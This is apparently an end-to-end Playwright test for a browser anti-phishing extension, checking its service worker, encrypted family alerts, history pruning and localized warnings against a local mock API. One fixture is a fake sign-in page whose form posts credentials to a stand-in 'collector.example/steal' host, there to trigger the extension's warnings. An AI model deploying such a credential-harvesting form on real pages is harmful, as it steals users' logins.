#!/usr/bin/env node
/**
 * End-to-end test of the extension's background service worker in a real
 * Chromium, with the unpacked build loaded exactly as a user would load it.
 *
 * Run with:  node scripts/test-extension-sw.mjs [tree ...]
 *            (default trees: extension extension-safari)
 * Needs:     playwright + tweetnacl resolvable (repo node_modules, or NODE_PATH)
 *            and `npx playwright install chromium`.
 *
 * WHY THIS FILE EXISTS
 * --------------------
 * The background used to be a classic MV3 service worker that loaded its
 * helpers with import(). Service workers forbid import(); every call threw
 * "import() is disallowed on ServiceWorkerGlobalScope", and the try/catch
 * around each call swallowed it. So for every user, silently:
 *   - the threat counter was never sent,
 *   - Family Hub alerts were never encrypted and sent to relatives,
 *   - the Family Hub poller never ran (no alarm, no notifications),
 *   - the daily 30-day history prune promised in docs/PRIVACY.md never ran.
 * Unit tests could not see it: the code was fine, the runtime refused it.
 * Only a real browser can, so this test drives one.
 *
 * NO PRODUCTION TRAFFIC
 * ---------------------
 * A local mock API answers every call (api_url is pointed at it through the
 * same chrome.storage override the Options page uses), and Chromium's host
 * resolver maps *.cleanway.ai to nowhere, so a stray request fails instead of
 * reaching production.
 *
 * The Safari tree is loaded into Chromium too: that cannot prove Safari's
 * runtime, but it does prove the Safari manifest + module graph load and run.
 * The Firefox tree is MV2 and Chromium no longer loads MV2; it is covered by
 * the static checks in scripts/test-extension-core.mjs.
 */
import assert from "node:assert/strict";
import { createServer } from "node:http";
import { createRequire } from "node:module";
import { existsSync, mkdtempSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";

// createRequire honours NODE_PATH, which CI uses to point at a throwaway install.
const require = createRequire(import.meta.url);
const { chromium } = require("playwright");
const nacl = require("tweetnacl");

const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), "..");
const TREES = process.argv.slice(2).length ? process.argv.slice(2) : ["extension", "extension-safari"];

const TOKEN = "e2e-token";
const FAMILY_ID = "fam-e2e";
const DAY_MS = 24 * 60 * 60 * 1000;

// ── helpers ──

const b64url = (bytes) => Buffer.from(bytes).toString("base64url");
const fromB64url = (s) => new Uint8Array(Buffer.from(s, "base64url"));

async function until(what, fn, timeoutMs = 10000) {
  const deadline = Date.now() + timeoutMs;
  let last;
  while (Date.now() < deadline) {
    last = await fn();
    if (last) return last;
    await new Promise((r) => setTimeout(r, 150));
  }
  throw new Error(`timed out waiting for ${what}`);
}

function sealFor(recipientPub, senderKeys, payload) {
  const nonce = nacl.randomBytes(nacl.box.nonceLength);
  const ct = nacl.box(Buffer.from(JSON.stringify(payload)), nonce, recipientPub, senderKeys.secretKey);
  return { ciphertext_b64: b64url(ct), nonce_b64: b64url(nonce), sender_pubkey_b64: b64url(senderKeys.publicKey) };
}

function openFrom(envelope, recipientKeys) {
  const opened = nacl.box.open(
    fromB64url(envelope.ciphertext_b64),
    fromB64url(envelope.nonce_b64),
    fromB64url(envelope.sender_pubkey_b64),
    recipientKeys.secretKey,
  );
  return opened ? JSON.parse(Buffer.from(opened).toString("utf8")) : null;
}

// ── mock API ──

const PAGES = {
  "/credential-form.html":
    "<!doctype html><title>Sign in</title><form action=\"http://collector.example/steal\" method=\"post\">" +
    "<input type=\"text\" name=\"u\"><input type=\"password\" name=\"p\"><button>Sign in</button></form>",
  "/orphan-password.html":
    "<!doctype html><title>Verify</title><div id=\"trap\"><input type=\"email\">" +
    "<input type=\"password\"><span>Continue</span></div>",
};

function startMockApi() {
  const calls = [];
  const state = { inbox: [] };
  const cors = {
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Headers": "Authorization, Content-Type",
    "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
  };
  const server = createServer((req, res) => {
    let raw = "";
    req.on("data", (c) => { raw += c; });
    req.on("end", () => {
      const url = new URL(req.url, "http://mock");
      const body = raw ? JSON.parse(raw) : null;
      if (req.method !== "OPTIONS") calls.push({ method: req.method, path: url.pathname, body, auth: req.headers.authorization });
      const json = (status, data) => {
        res.writeHead(status, { ...cors, "Content-Type": "application/json" });
        res.end(JSON.stringify(data));
      };
      if (req.method === "OPTIONS") { res.writeHead(204, cors); return res.end(); }
      if (PAGES[url.pathname]) {
        res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
        return res.end(PAGES[url.pathname]);
      }
      const check = url.pathname.match(/^\/api\/v1\/public\/check\/(.+)$/);
      if (check) {
        const domain = decodeURIComponent(check[1]);
        const scam = domain.startsWith("scam-");
        return json(200, { domain, score: scam ? 97 : 2, level: scam ? "dangerous" : "safe", signals: [] });
      }
      if (url.pathname === "/api/v1/user/threats/increment") return json(200, { threats_blocked_lifetime: 1 });
      if (url.pathname === `/api/v1/family/${FAMILY_ID}/alerts`) {
        if (req.method === "POST") return json(200, { accepted: body.envelopes.length });
        return json(200, { alerts: state.inbox });
      }
      return json(404, { detail: "not mocked" });
    });
  });
  return new Promise((ok) => server.listen(0, "127.0.0.1", () => {
    ok({ server, calls, state, base: `http://127.0.0.1:${server.address().port}` });
  }));
}

// ── browser ──

// Russian first: most of our users are, and it proves the strings are not English.
const UI_LANG = "ru";

async function launch(tree, lang = UI_LANG) {
  const extPath = resolve(ROOT, tree);
  const userDir = mkdtempSync(join(tmpdir(), "cleanway-e2e-"));
  const context = await chromium.launchPersistentContext(userDir, {
    channel: "chromium",
    headless: true,
    locale: lang,
    // Linux Chromium reads its UI language from these, not from --lang.
    env: { ...process.env, LANGUAGE: lang, LANG: `${lang}_${lang.toUpperCase()}.UTF-8` },
    args: [
      `--disable-extensions-except=${extPath}`,
      `--load-extension=${extPath}`,
      `--lang=${lang}`,
      "--host-resolver-rules=MAP *.cleanway.ai ~NOTFOUND, MAP cleanway.ai ~NOTFOUND",
    ],
  });
  let [sw] = context.serviceWorkers();
  if (!sw) sw = await context.waitForEvent("serviceworker", { timeout: 15000 });
  return { context, sw, extId: new URL(sw.url()).host, userDir };
}

function readCatalog(tree, locale) {
  return JSON.parse(readFileSync(resolve(ROOT, tree, "_locales", locale, "messages.json"), "utf8"));
}

// The catalog chrome.i18n actually serves. Chromium honours --lang/LANGUAGE on
// Linux, but on macOS it follows the system language list instead, so the
// test asks rather than assumes ("ru", "en_US", "pt_BR"... → our folder name).
async function activeCatalog(sw, tree) {
  const uiLocale = await sw.evaluate(() => chrome.i18n.getMessage("@@ui_locale"));
  const exact = uiLocale.replace("-", "_");
  const base = exact.split("_")[0];
  const locale = existsSync(resolve(ROOT, tree, "_locales", exact)) ? exact : base;
  return { locale, messages: readCatalog(tree, locale) };
}

async function sendCheck(page, domains) {
  return page.evaluate((d) => chrome.runtime.sendMessage({ type: "CHECK_DOMAINS", domains: d }), domains);
}

async function seedHistory(sw, rows) {
  await sw.evaluate(async (records) => {
    const db = await new Promise((ok, fail) => {
      const req = indexedDB.open("cleanway", 1);
      req.onupgradeneeded = () => {
        const d = req.result;
        const store = d.createObjectStore("checks", { keyPath: "id", autoIncrement: true });
        store.createIndex("domain", "domain", { unique: false });
        store.createIndex("checked_at", "checked_at", { unique: false });
        store.createIndex("level", "level", { unique: false });
        d.createObjectStore("settings", { keyPath: "key" });
      };
      req.onsuccess = () => ok(req.result);
      req.onerror = () => fail(req.error);
    });
    const tx = db.transaction("checks", "readwrite");
    for (const r of records) tx.objectStore("checks").add(r);
    await new Promise((ok) => { tx.oncomplete = ok; });
    db.close();
  }, rows);
}

async function historyDomains(sw) {
  return sw.evaluate(() => new Promise((ok, fail) => {
    const req = indexedDB.open("cleanway", 1);
    req.onsuccess = () => {
      const all = req.result.transaction("checks").objectStore("checks").getAll();
      all.onsuccess = () => { ok(all.result.map((r) => r.domain).sort()); req.result.close(); };
      all.onerror = () => fail(all.error);
    };
    req.onerror = () => fail(req.error);
  }));
}

// ── the suite ──

async function runTree(tree) {
  const failures = [];
  let ok = 0;
  const check = async (name, fn) => {
    try { await fn(); ok++; console.log(`  ok    [${tree}] ${name}`); }
    catch (err) { failures.push(name); console.error(`  FAIL  [${tree}] ${name}\n        ${err && err.message}`); }
  };

  const api = await startMockApi();
  const me = nacl.box.keyPair();      // this browser's Family Hub keys
  const mom = nacl.box.keyPair();     // a relative in the same family
  const { context, sw, extId, userDir } = await launch(tree);

  try {
    await check("service worker registers both recurring alarms at install", async () => {
      const names = await until("alarms", async () => {
        const list = await sw.evaluate(() => chrome.alarms.getAll().then((a) => a.map((x) => x.name)));
        return list.includes("cleanway_family_poll") && list.includes("cleanway_history_prune") ? list : null;
      }, 5000);
      assert.ok(names.includes("cleanway_family_poll"));
    });

    await sw.evaluate(async (cfg) => {
      await chrome.storage.local.set({
        api_url: cfg.base,
        auth_token: cfg.token,
        family_cache: { family_id: cfg.familyId, members: [{ user_id: "mom", public_key_b64: cfg.momPub }], cached_at: Date.now() },
        family_public_key_b64: cfg.myPub,
        family_secret_key_b64: cfg.mySec,
      });
    }, { base: api.base, token: TOKEN, familyId: FAMILY_ID, momPub: b64url(mom.publicKey), myPub: b64url(me.publicKey), mySec: b64url(me.secretKey) });

    const page = await context.newPage();
    await page.goto(`chrome-extension://${extId}/src/popup/welcome.html`);

    // The modules pick the new api_url up through storage.onChanged; probe
    // with fresh names until a check lands on the mock.
    let probe = 0;
    await until("api_url override to reach the background", async () => {
      await sendCheck(page, [`probe-${probe++}.example`]);
      return api.calls.some((c) => c.path.startsWith("/api/v1/public/check/probe-"));
    });

    await check("a dangerous verdict sends the threat counter", async () => {
      const resp = await sendCheck(page, ["scam-e2e-1.example"]);
      assert.equal(resp.results[0].level, "dangerous");
      const call = await until("threat counter POST", async () =>
        api.calls.find((c) => c.method === "POST" && c.path === "/api/v1/user/threats/increment"));
      assert.deepEqual(call.body, { count: 1 });
      assert.equal(call.auth, `Bearer ${TOKEN}`);
    });

    await check("a dangerous verdict is end-to-end encrypted to the family", async () => {
      const call = await until("family alerts POST", async () =>
        api.calls.find((c) => c.method === "POST" && c.path === `/api/v1/family/${FAMILY_ID}/alerts`));
      assert.equal(call.body.envelopes.length, 1);
      const env = call.body.envelopes[0];
      assert.equal(env.recipient_user_id, "mom");
      assert.equal(env.sender_pubkey_b64, b64url(me.publicKey));
      const alert = openFrom(env, mom);
      assert.ok(alert, "mom could not open the envelope");
      assert.equal(alert.domain, "scam-e2e-1.example");
      assert.ok(!JSON.stringify(call.body).includes("scam-e2e-1"), "domain must not travel in clear text");
    });

    await check("known-safe shortcut trusts exact official hosts only", async () => {
      const resp = await sendCheck(page, ["www.google.com", "sites.google.com", "forms.yandex.ru", "scam-e2e-2.wordpress.com"]);
      assert.equal(resp.results.length, 4);
      const asked = new Set(api.calls.map((c) => c.path));
      assert.ok(!asked.has("/api/v1/public/check/www.google.com"), "www.google.com should not need the API");
      for (const host of ["sites.google.com", "forms.yandex.ru", "scam-e2e-2.wordpress.com"]) {
        assert.ok(asked.has(`/api/v1/public/check/${host}`), `${host} must be checked by the API`);
      }
      const hosted = resp.results.find((r) => r.domain === "scam-e2e-2.wordpress.com");
      assert.equal(hosted.level, "dangerous", "a scam on *.wordpress.com must not be 'known safe'");
    });

    await check("the daily prune deletes history older than 30 days and keeps the rest", async () => {
      const now = Date.now();
      await seedHistory(sw, [
        { domain: "old-40d.example", level: "safe", score: 0, reasons: [], checked_at: new Date(now - 40 * DAY_MS).toISOString() },
        { domain: "old-31d.example", level: "caution", score: 40, reasons: [], checked_at: new Date(now - 31 * DAY_MS).toISOString() },
        { domain: "fresh-1d.example", level: "safe", score: 0, reasons: [], checked_at: new Date(now - 1 * DAY_MS).toISOString() },
      ]);
      await sw.evaluate(() => chrome.alarms.create("cleanway_history_prune", { when: Date.now() + 200 }));
      const left = await until("prune", async () => {
        const d = await historyDomains(sw);
        return d.length === 1 ? d : null;
      });
      assert.deepEqual(left, ["fresh-1d.example"]);
    });

    await check("the Family Hub poller decrypts a relative's alert into a notification", async () => {
      api.state.inbox = [{
        id: "alert-e2e-1",
        created_at: new Date().toISOString(),
        ...sealFor(me.publicKey, mom, { domain: "scam-for-grandma.example", level: "dangerous", alert_type: "block" }),
      }];
      await sw.evaluate(() => chrome.alarms.create("cleanway_family_poll", { when: Date.now() + 200 }));
      const shown = await until("family notification", async () => {
        const ids = await sw.evaluate(() => chrome.notifications.getAll().then((n) => Object.keys(n)));
        return ids.includes("cleanway-family:alert-e2e-1") ? ids : null;
      });
      assert.ok(shown);
      const seen = await sw.evaluate(() => chrome.storage.local.get("family_last_seen_alert_id"));
      assert.equal(seen.family_last_seen_alert_id, "alert-e2e-1");
    });

    await check("family crypto still works in extension pages (Options path)", async () => {
      const roundTrip = await page.evaluate(async () => {
        const c = await import(chrome.runtime.getURL("src/utils/family-crypto.js"));
        const kp = await c.getOrCreateKeypair();
        const env = c.encryptForRecipient({ domain: "пример.рф", n: 1 }, kp.publicKeyB64, kp.secretKeyB64);
        return c.decryptForMe(env, kp.secretKeyB64);
      });
      assert.deepEqual(roundTrip, { domain: "пример.рф", n: 1 });
    });

    await check("content-script warnings come from the browser-language catalog, not English", async () => {
      const { locale, messages } = await activeCatalog(sw, tree);
      const english = readCatalog(tree, "en");
      assert.notEqual(locale, "en",
        "Chromium started in English, so this check would prove nothing; on macOS the extension follows the system language");
      const msg = (key) => messages[key].message;
      const tab = await context.newPage();
      await tab.goto(`${api.base}/credential-form.html`);
      const banner = await (await tab.waitForSelector("#ls-credguard-banner", { timeout: 8000 })).innerText();
      assert.ok(banner.includes(msg("credguard_banner_title")), `[${locale}] banner: ${banner}`);
      assert.ok(banner.includes(msg("credguard_dismiss")), `[${locale}] banner: ${banner}`);
      assert.ok(!banner.includes(english.credguard_banner_advice.message), `English left in banner: ${banner}`);
      await tab.click("button");
      const modal = await (await tab.waitForSelector("#ls-credguard-modal", { timeout: 5000 })).innerText();
      for (const key of ["credguard_modal_title", "credguard_button_cancel", "credguard_button_override"]) {
        assert.ok(modal.includes(msg(key)), `[${locale}] modal lacks ${key}: ${modal}`);
      }
      assert.ok(!/credguard_|Submit anyway/.test(modal), `raw key or English in modal: ${modal}`);
      await tab.goto(`${api.base}/orphan-password.html`);
      const bar = await (await tab.waitForSelector("#cw-modern-phish-banner", { timeout: 8000 })).innerText();
      assert.ok(bar.includes(msg("mpg_orphan")), `[${locale}] modern-phish banner: ${bar}`);
      await tab.close();
      console.log(`        (content scripts rendered the "${locale}" catalog)`);
    });
  } finally {
    await context.close();
    rmSync(userDir, { recursive: true, force: true });
    api.server.close();
  }
  return { ok, failures };
}

let totalOk = 0;
const allFailures = [];
for (const tree of TREES) {
  const { ok, failures } = await runTree(tree);
  totalOk += ok;
  allFailures.push(...failures.map((f) => `[${tree}] ${f}`));
}
console.log(allFailures.length === 0
  ? `\n${totalOk} browser checks passed (${TREES.join(", ")})`
  : `\n${allFailures.length} FAILED, ${totalOk} passed`);
process.exit(allFailures.length === 0 ? 0 : 1);
